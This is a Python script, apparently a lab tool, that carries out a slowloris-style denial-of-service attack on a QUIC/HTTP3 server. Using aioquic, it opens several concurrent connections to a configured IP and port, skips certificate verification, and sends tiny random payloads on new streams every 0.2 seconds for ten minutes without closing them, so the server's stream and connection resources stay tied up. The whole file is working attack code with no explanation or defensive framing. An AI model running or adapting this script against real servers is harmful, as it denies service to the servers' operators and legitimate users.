import asyncio
from aioquic.asyncio import connect
from aioquic.quic.configuration import QuicConfiguration
import random
import string

# === Configuration ===
SERVER_ADDR = "192.168.58.128"    # <-- Your QUIC server IP
SERVER_PORT = 4433                 # QUIC server port
TOTAL_CONNECTIONS =   5          # Number of simultaneous slow connections
PAYLOAD_INTERVAL =  0.2               # Interval (seconds) between sending tiny payloads
PAYLOAD_SIZE = 50                   # Size of each random payload (bytes)
RUN_DURATION = 600                   # Total duration of attack in seconds

# === Helper Function to Create Random Payload ===
def random_payload(size=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size)).encode()

# === Attack Connection Logic ===
async def slow_connection(configuration):
    try:
        async with connect(SERVER_ADDR, SERVER_PORT, configuration=configuration) as client:
            while True:
                await asyncio.sleep(PAYLOAD_INTERVAL)
                try:
                    stream_id = client._quic.get_next_available_stream_id()
                    client._quic.send_stream_data(stream_id, random_payload(PAYLOAD_SIZE), end_stream=False)
                except Exception as e:
                    print(f"[!] Slow send error: {e}")
                    break
    except Exception as e:
        print(f"[!] Connection error: {e}")

# === Main Attack Orchestrator ===
async def main():
    configuration = QuicConfiguration(
        is_client=True,
        verify_mode=False,
        alpn_protocols=["h3"]  # HTTP/3 ALPN
    )

    print(f"[+] Launching {TOTAL_CONNECTIONS} slow QUIC connections towards {SERVER_ADDR}:{SERVER_PORT}...")

    tasks = []
    for _ in range(TOTAL_CONNECTIONS):
        task = asyncio.create_task(slow_connection(configuration))
        tasks.append(task)
        await asyncio.sleep(0.1)  # Small delay between connection startups

    await asyncio.sleep(RUN_DURATION)

    for task in tasks:
        task.cancel()

if __name__ == "__main__":
    asyncio.run(main())
